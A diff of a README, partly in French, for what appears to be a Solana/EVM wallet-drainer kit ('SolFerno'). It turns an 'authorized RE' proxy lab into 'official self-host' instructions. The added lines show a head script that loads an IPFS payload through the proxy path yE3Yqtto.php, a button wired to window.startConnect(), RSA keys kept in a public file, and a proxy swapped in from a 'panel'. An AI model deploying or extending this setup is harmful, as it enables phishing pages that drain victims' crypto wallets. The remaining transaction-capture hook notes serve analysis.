@@ -1,35 +1,36 @@
-# SolFerno proxy lab (Vercel)
+# Self-host lab (Vercel) — même layout que SolFerno stable build
 
-Node port of `yE3Yqtto.php` for **authorized RE**: same-origin kit page + `/yE3Yqtto.php?s=` / `?e=` forward to the on-chain backend.
+Setup officiel **self-host** :
 
-## Deploy (Vercel + GitHub)
+1. **`yE3Yqtto.php`** dans le **même dossier** que `index.html` → ici : `public/yE3Yqtto.php` + `public/index.html`
+2. Dans le `<head>` :
 
-1. Push this repo to GitHub.
-2. [Vercel](https://vercel.com) → **Import** the repo → deploy (no build command needed).
-3. **Environment variables** (Settings → Environment Variables):
-   - `KEY_SOL` — PEM `keySol` from your `yE3Yqtto.php` (full `-----BEGIN PRIVATE KEY-----` … block).
-   - `KEY_EVM` — PEM `keyEvm` (optional if you only test SOL).
+```html
+<script>
+  document.head.append(
+    Object.assign(document.createElement("script"), {
+      src:
+        "/yE3Yqtto.php?s=%2Fipfs%2FPOsdex8izESA8Aqsm4d51Q2289c0429306bf23bb8292d19b15f836%3Ft%3D" +
+        Date.now(),
+    }),
+  );
+</script>
+```
 
-   Do **not** commit PEMs to GitHub.
+3. Bouton : `class="8i70TZbI il3Miquj"` ou `onclick="window.startConnect()"`
 
-4. Open `https://<your-project>.vercel.app/` (or `/runtime`).
+**Drakard** (`/secureproxy?...`) : autre hébergeur ; ici c’est le path **`/yE3Yqtto.php`** comme dans le build stable.
 
-## Endpoints
+## Vercel
 
-| Path | Role |
-|------|------|
-| `/` | Kit page + auto-loaded IPFS payload via proxy |
-| `/yE3Yqtto.php?s=...` | SOL upstream forward (API) |
-| `/yE3Yqtto.php?e=...` | EVM upstream forward |
-| `/yE3Yqtto.php?e=ping_proxy` | `pong` health check |
-| `/hook.js` | Capture decrypted tx JSON → `window.__labParsedPayloads` |
+- Import repo GitHub → Deploy. **Aucune variable d’env** : les clés RSA sont **dans `public/yE3Yqtto.php`**, comme en PHP classique.
+- Vercel ne exécute pas PHP : la route `/yE3Yqtto.php` est **réécrite** vers `api/proxy.js`, qui fait la même chose que `SecureProxyMiddleware::handle()`.
 
-## Capture Solana instructions
+Ping : `/yE3Yqtto.php?e=ping_proxy` → `pong`
 
-1. Open the deployed site in a normal browser (Phantom / Solflare installed).
-2. DevTools → after connect: `copy(JSON.stringify(window.__labParsedPayloads))`.
+## Capture txs (RE)
 
-Origin/Referer sent upstream = your **Vercel URL** (not localhost).
+`public/hook.js` est chargé avant le kit → `window.__labParsedPayloads` après connect.
 
 ## Local
 
@@ -37,8 +38,4 @@ Origin/Referer sent upstream = your **Vercel URL** (not localhost).
 npx vercel dev
 ```
 
-Set `KEY_SOL` / `KEY_EVM` in `.env.local` (see `.env.example`).
-
-## Note on PHP
-
-Vercel does not run PHP; `api/proxy.js` mirrors `SecureProxyMiddleware::handle()` from the artifact PHP.
+Remplace `public/yE3Yqtto.php` par **ton** fichier proxy fourni par le panel si tu en as un autre.
